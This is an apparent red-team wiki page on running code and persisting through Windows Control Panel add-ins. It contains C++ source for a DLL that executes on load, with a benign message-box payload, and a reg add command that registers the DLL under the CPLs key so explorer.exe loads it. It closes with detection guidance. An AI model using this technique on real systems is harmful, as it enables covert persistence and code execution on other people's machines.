# Code Execution through Control Panel Add-ins

## Code Execution through Control Panel Add-ins

It's possible to force explorer.exe to load your DLL that is compiled as a Control Panel Item and is registered as a Control Panel Add-in.

{% hint style="info" %}
This technique could also be considered for persistence.
{% endhint %}

### Execution

Let's compile our control panel item (which is a simple DLL with an exported function `Cplapplet`) from the below code:

```cpp
#include <Windows.h>
#include "pch.h"

//Cplapplet
extern "C" __declspec(dllexport) LONG Cplapplet(
    HWND hwndCpl,
    UINT msg,
    LPARAM lParam1,
    LPARAM lParam2
)
{
    MessageBoxA(NULL, "Hey there, I am now your control panel item you know.", "Control Panel", 0);
    return 1;
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        Cplapplet(NULL, NULL, NULL, NULL);
    }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

Let's now register our control panel item as an add-in (defenders beware of these registry modifications):

```
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Control Panel\CPLs" /v spotless /d "C:\labs\cplAddin\cplAddin\x64\Release\cplAddin2.dll" /f
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-MAHMzIzOTsPGuIdKsAa%2F-MAHaORnicckqEQhwYT-%2Fimage.png?alt=media\&token=5034fcce-4350-433c-804d-6eaa43a819b3)

Now, whenever the Control Panel is opened, our DLL will be injected into explorer.exe and our code will execute:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-MAHbDywRIGCazbSk6Ck%2F-MAHc5q-vFlK4vwRqRGL%2Fcontrol-panel-item-addin.gif?alt=media\&token=5549a205-3c07-466d-8e76-5e0bf175de70)

Below shows that our DLL is injected into explorer.exe:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-MAHbDywRIGCazbSk6Ck%2F-MAHe8Inj3QJgEYxnGzc%2Fimage.png?alt=media\&token=05110556-5e7e-481f-9792-b3db766a541e)

### Detection

* Look for modifications in the following registry key: `HKCU\Software\Microsoft\Windows\CurrentVersion\Control Panel\CPLs`
* Look for / prevent DLLs from loading from unsecure locations

### References

[https://www.welivesecurity.com/wp-content/uploads/2020/06/ESET\_InvisiMole.pdf](https://www.welivesecurity.com/wp-content/uploads/2020/06/ESET_InvisiMole.pdf)
